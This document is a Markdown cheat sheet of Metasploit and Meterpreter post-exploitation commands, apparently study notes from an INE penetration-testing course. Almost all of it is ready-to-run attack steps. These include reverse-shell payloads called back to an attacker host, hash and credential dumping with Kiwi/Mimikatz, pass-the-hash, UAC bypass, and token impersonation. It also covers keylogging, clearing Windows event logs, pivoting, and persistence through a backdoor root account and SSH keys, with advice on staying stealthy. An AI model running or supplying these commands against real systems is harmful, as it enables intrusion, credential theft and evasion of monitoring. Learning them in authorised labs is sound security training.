# Post Exploitation.md

* [Meterpreter Fundamentals](#meterpreter-fundamentals)
* [Upgrading Command Shells To Meterpreter Shells](#upgrading-command-shells-to-meterpreter-shells)
* [Windows Post Exploitation](#windows-post-exploitation)
   * [Some Useful Modules](#some-useful-modules)
   * [Bypassing UAC](#bypassing-uac)
   * [Token Impersonation with Incognito](#token-impersonation-with-incognito)
   * [Kiwi (Mimikatz msfconsole extension)](#kiwi-mimikatz-msfconsole-extension)
   * [Pass-The-Hash with PSExec Module](#pass-the-hash-with-psexec-module)
   * [Establishing Persistence](#establishing-persistence)
   * [Enabling RDP](#enabling-rdp)
   * [Windows Keylogging](#windows-keylogging)
   * [Clearing Windows Event Logs](#clearing-windows-event-logs)
   * [Pivoting](#pivoting)
* [Linux Post Exploitation](#linux-post-exploitation)
   * [Dumping Hashes With Hashdump](#dumping-hashes-with-hashdump)
   * [Establishing Persistence On linux](#establishing-persistence-on-linux)
* [References](#references)

***********************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
***********************************************************************

## Meterpreter Fundamentals

```
sysinfo
```
```
getuid
```
```
help
```
```
background
```
```
sessions
```
```
sessions -h
```
```
exit
```
```
search
```
```
show options
```
```
loot
```
```
notes
```

***********************************************************************

## Upgrading Command Shells To Meterpreter Shells

### Auto method:
```
sessions -u [SESSION-ID]
```
Use session:
```
sessions [SESSION-ID]
```

### More manual method:
```
search shell_to_meterpreter
```
```
post/multi/manage/shell_to_meterpreter
```
```
set session [SESSION-ID]
```
```
set LHOST [ATTACK-IP or INTERFACE]
```
```
run
```
```
sessions
```
Use session:
```
sessions [SESSION-ID]
```

***********************************************************************

## Windows Post Exploitation

There are windows specific meterpreter commands, use 'help' to list commands.  

Attempt to elevate privileges with:
```
getsystem
```
```
hashdump
```
```
enumdesktops
```
```
keyscan_start
```
```
keyscan_stop
```
```
kyescan_dump
```
```
screenshot
```
```
show_mount
```
```
ps
```
```
migrate [PID]
```

***********************************************************************

### Some Useful Modules

```
use post/windows/manage/migrate
```
```
use post/windows/gather/win_privs
```
```
use post/windows/manage/migrate
```
```
use post/windows/gather/enum_logged_on_users
```
```
use post/windows/gather/checkvm
```
```
use post/windows/gather/enum_applications
```
```
use post/windows/gather/enum_av_excluded
```
```
use post/windows/gather/enum_computers
```
```
use post/windows/gather/enum_patches
```
```
use post/windows/gather/enum_shares
```
```
use post/windows/manage/enable_rdp
```

***********************************************************************

### Bypassing UAC

```
search bypassuac
```
```
use exploit/windows/local/bypassuac_injection
```
```
set payload windows/x64/meterpreter/reverse_tcp
```
```
set SESSION [SESSION-ID]
```
```
set LPORT [PORT]
```
```
set TARGET Windows\ x64
```
```
run
```
```
getsystem
```

***********************************************************************

### Token Impersonation with Incognito

Once initial meterpreter session is obtained, list user privileges:
```
getprivs
```
If SeImpersonatePrivilege is set:

```
load incognito
```
```
list_tokens -u
```
Copy name of Delegation Token then run:
```
impersonate_token "[TOKEN]"
```
Example:
```
impersonate_token "ATTACKDEFENSE\Administrator"
```
Confirm privileges:
```
getuid
```
Migrate to x64 process:
```
pgrep explorer
```
```
migrate [EXPLORER-PID]
```
Check privileges again:
```
getprivs
```
```
getuid
```
List Tokens again to escalate privileges further:
```
list_tokens -u
```
and impersonate the next token:
```
impersonate_token "NT AUTHORITY\SYSTEM"
```

***********************************************************************

### Kiwi (Mimikatz msfconsole extension)

```
migrate [LSASS-PID]
```
```
load kiwi
```
Help menu:
```
?
```
Retrieve all credentials (parsed):
```
creds_all
```
Dump hashes for all users:
```
lsa_dump_sam
```
Possibly dump clear text creds:
```
lsa_dump_secrets
```

***********************************************************************

### Pass-The-Hash with PSExec Module

```
use exploit/windows/smb/psexec
```
```
set PAYLOAD [PAYLOAD]
```
```
set SMBUser [USERNAME]
```
```
set SMBPass [LM-HASH:NTLM-HASH]
```
Example:
```
set SMBPass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
```

***********************************************************************

### Establishing Persistence

```
search platform:windows persistence
```
```
use exploit/windows/local/persistence_service
```
```
set payload [PAYLOAD]
```
```
set SESSION [SESSION-ID]
```
```
run
```
* After session is killed:
```
use multi/handler
```
```
set payload [PAYLOAD]
```
```
set LHOST [ATTACK-IP or INTERFACE]
```
```
run
```

***********************************************************************

### Enabling RDP 

First, Background meterpreter sesssion, then run the following commands in msfconsole:

```
search enable_rdp
```
```
use post/windows/manage/enable_rdp
```
```
set SESSION [SESSION-ID]
```
```
run
```
* RDP should now be enabled on target machine. Use nmap to verify.
* Once verified, foreground original meterpreter session:
```
sessions [SESSION-ID]
```
* Get user creds, preferably admin creds
* You can change passwords by:
```
shell
```
```
net user [USERNAME] [PASSWORD]
```
*DO NOT CHANGE ADMIN PASSWORD IF YOU ARE TRYING TO BE STEALTHY; OBTAIN CREDS BY OTHER METHODS*  

* Terminate channel with ctrl + c  

* now log in with xfreerdp from attack machine:
```
xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET-IP]
```
Example:
```
xfreerdp /u:administrator /p:hacker_8686 /v:10.3.23.139
```

***********************************************************************

### Windows Keylogging

*Keylogging is not limited to post exploitation*   

* Get a meterpreter shell first
* Keylogging has issues when not running in the explorer processes.
```
pgrep explorer
```
```
migrate [EXPLORER-PID]
```
```
keyscan_start
```
```
keyscan_dump
```
```
keyscan_stop
```
* You can't use keyscan_dump after keyscan_stop. keyscan_dump only works while keyscan_start is running...

***********************************************************************

### Clearing Windows Event Logs

* In meterpreter shell:
```
clearev
```
*Yeah, it's that easy to wipe ALL Windows Event Logs!*

***********************************************************************

###  Pivoting

* After getting a meterpreter shell on Target 1, set up a route to the internal network:
```
run autoroute -s [SUBNET/CIDR]
```
Example:
```
run autoroute -s 10.3.16.0/20
```
* Now background session and rename it to track it easier:
```
sessions -n "[NAME-OF-SESSION]" -i [SESSION-ID]
```
* Now port scan the internal network  
*You can't use nmap or extenal modules, only msfconsole modules* 

```
search portscan
```
```
use auxiliary/scanner/portscan/tcp
```
```
set RHOSTS [TARGET-2-IP]
```
```
set PORTS [PORT-RANGE]
```
```
run
```
*The new network route is only available in msfconsole*

* To preform service enumeration via nmap, we need to port forward the vulnerable service on target 2 to our attack machine.  
To do this, foreground the Target 1 session and run:
```
portfwd add -l [ATTACK-PORT] -p [TARGET-2-VULNERABLE-PORT] -r [TARGET-2-IP]
```
Example:
```
portfwd add -l 1234 -p 80 -r 10.4.18.61
```
* Now we can do db_nmap scans of Target 2 in msfsoncole 
* But since we are portfowarding, we have to scan the attack port we specified in the portfwd command. In this case: port 1234 on our local machine:
```
db_nmap [OPTIONS] -p [ATTACK-PORT] localhost
```
Example:
```
db_nmap -sS -sV -p 1234 localhost
```
* Now use an applicable exploit module to exploit the target  
*Keep in mind that the default port you used for target 1 will need to be different when exploiting target 2*
```
set LPORT [PORT]
```
*Also keep in mind that a reverse tcp shell will NOT work*
* Set the payload to a bind shell:
```
set payload windows/meterpreter/bind_tcp
```
```
run
```

***********************************************************************

## Linux Post Exploitation

Upgrade to meterpreter session:
```
sessions -u [SESSION-ID]
```
```
sysinfo
```
```
getuid
```
```
shell
```
Stabilize shell with:
```
/bin/bash -i
```
Modules:
```
use post/linux/gather/enum_configs
```
```
use post/multi/gather/env
```
```
use post/linux/gather/enum_network
```
```
use post/linux/gather/enum_protections
```
```
use post/linux/gather/enum_system
```
```
use post/linux/gather/checkcontainer
```
```
use post/linux/gather/checkvm
```
```
use post/linux/gather/enum_users_history
```

***********************************************************************

### Dumping Hashes With Hashdump

After getting a meterpreter session on the target...   
  
Hashdump has to be loaded manually on linux...  

```
search hashdump
```
```
use post/linux/gather/hashdump
```
```
set SESSION [SESSION-ID]
```
```
run
```

***********************************************************************

### Establishing Persistence On linux

#### Manual

If remote management protocol is enabled (SSH for example), create a backdoor user account:

```
useradd -m [USERNAME] -s /bin/bash
```
```
passwd [USERNAME]
```
Add backdoor user to root group:  
```
usermod -aG root [USERNAME]
```
Change UID:
```
usermod -u [NEW-UID] [USERNAME]
```

#### Modules

```
search platform:linux persistence
```
Use a module that looks like it will work. It depends on the target. This will take trial and error...

Top choice from instructor:
```
use post/linux/manage/sshkey_persistence
```
```
set CREATESSHFOLDER true
```
```
set SESSION [SESSION-ID]
```
```
run
```
Get private ssh key with 'loot' and store it on attack machine, and give ssh_key correct permissions:
```
chmod 0400 ssh_key
```
Login:
```
ssh -i ssh_key root@[TARGET-IP]
```


***********************************************************************

### References
Penetration Tester Student v2 by INE  
https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student-v2